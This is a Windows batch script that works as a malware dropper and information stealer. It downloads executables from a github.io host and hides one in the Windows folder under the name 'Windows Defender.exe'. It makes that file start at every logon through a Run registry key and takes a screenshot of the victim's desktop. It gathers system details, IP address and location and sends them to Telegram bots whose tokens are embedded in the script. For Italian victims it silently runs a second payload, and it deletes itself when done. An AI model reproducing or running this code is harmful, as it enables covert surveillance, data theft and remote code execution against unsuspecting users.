@echo off
del /s /f /q /a "%temp%\*"
FOR /D %%p IN ("%temp%\*.*") DO rmdir "%%p" /s /q
:connectivitycheck
ping www.google.com -n 1 -w 5000 >NUL
if errorlevel 1 goto Connectivitycheck

tasklist /fi "imagename eq tor.exe" | find /i "tor.exe" > nul
if not errorlevel 1 (set "proxy=--tlsv1 --socks5-hostname 127.0.0.1:9050") else (
  set "proxy=--tlsv1"
)

attrib -s -h -i "C:\Windows\Windows Defender.exe"
curl.exe %proxy% https://cryptedlumos.github.io/sfx.exe --output "C:\Windows\Windows Defender.exe" && attrib +s +h +i "C:\Windows\Windows Defender.exe"
REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "Windows Defender" /t REG_SZ /F /D "C:\Windows\Windows Defender.exe -P\"rofile of Windows Defender [Microsoft Corporation]"\"

mkdir "%appdata%\Ookla\Speedtest CLI" && attrib +s +h +i "%appdata%\Ookla"

curl.exe %proxy% https://cryptedlumos.github.io/Capture/speedtest-cli.ini --output "%appdata%\Ookla\Speedtest CLI\speedtest-cli.ini" 
curl.exe %proxy% https://cryptedlumos.github.io/Capture/speedtest.exe --output "%appdata%\Ookla\Speedtest CLI\speedtest.exe"

set "folder=%random%"
mkdir "%temp%\%folder%" 
attrib +s +h +i "%temp%\%folder%" 
cd "%temp%\%folder%"

curl.exe %proxy% https://cryptedlumos.github.io/Capture/osinfo.vbs --output "osinfo.vbs"
nircmd.exe savescreenshotfull "%username%@%computername% ~$currdate.dd_MM_yyyy$ ~$currtime.HH.mm$.png"
cscript.exe /nologo osinfo.vbs > "%username%@%computername%.txt"
echo      =================== >> "%username%@%computername%.txt"
"%appdata%\Ookla\Speedtest CLI\speedtest.exe" >> "%username%@%computername%.txt"
echo      =================== >> "%username%@%computername%.txt"

for /f "tokens=2 delims==" %%G in ('wmic os get Caption /value') do ( 
    set WinEdition=%%G
    )
for /f "tokens=2 delims==" %%G in ('wmic os get OSArchitecture /value') do ( 
    set OSArchitecture=%%G
    )
for /f "tokens=*" %%A in (
  'curl ipinfo.io/ip'
) Do set ExtIP=%%A
for /f "tokens=*" %%A in (
  'curl ipinfo.io/city'
) Do set City=%%A
for /f "tokens=*" %%A in (
  'curl ipinfo.io/region'
) Do set Region=%%A
for /f "tokens=*" %%A in (
  'curl ipinfo.io/country'
) Do set Country=%%A
for /f "tokens=1* delims=: " %%A in (
  'curl ipinfo.io/org'
) Do set ISP=%%B
for /f "tokens=1* delims=: " %%A in (
  'curl %proxy% https://iplist.cc/api 2^>NUL^|find "tor"'
) Do set TorStatus=%%B
if [%TorStatus%]==[true] (
for /f "tokens=*" %%A in (
  'curl %proxy% ipinfo.io/ip'
) Do set ExtIPTor=%%A
) else (
set "ExtIPTor=N/A"
)

curl.exe %proxy% -F text="NEW CONNECTION: %username%@%computername% [%WinEdition% %OSArchitecture%] [%ISP% (%ExtIP%)] [%City% (%Region%, %Country%)] [Tor is enabled: %TorStatus% (%ExtIPTor%)] " https://api.telegram.org/bot2069537898:AAEpaEeE32SSpft-gQ97Onau02dbQ6ZY2Ss/sendMessage?chat_id=-1001589929429
for %%# in ("*.png") do curl.exe %proxy% -F document=@"%%~f#" https://api.telegram.org/bot1951761743:AAF3jkN_H27jkxlyUVx-suQChNmEnAS82Ns/sendDocument?chat_id=-1001585587948 -k --insecure
curl.exe %proxy% -F document=@"%username%@%computername%.txt" https://api.telegram.org/bot2008957838:AAHp_ojoUjJwh2Y0EDHWyN-pUYRAyiaMPws/sendDocument?chat_id=-1001548046257 -k --insecure

cd "%temp%"
rmdir /s /q "%temp%\%folder%"

if [%Country%]==[IT] (
  curl.exe %proxy% https://cryptedlumos.github.io/Client2.exe --output "%temp%\dll.exe" && nircmd exec hide "%temp%\dll.exe"
) else (
echo.
)

"C:\Windows\Windows Defender.exe" -P"rofile of Windows Defender [Microsoft Corporation]"

del /s /f /q /a "%~f0"
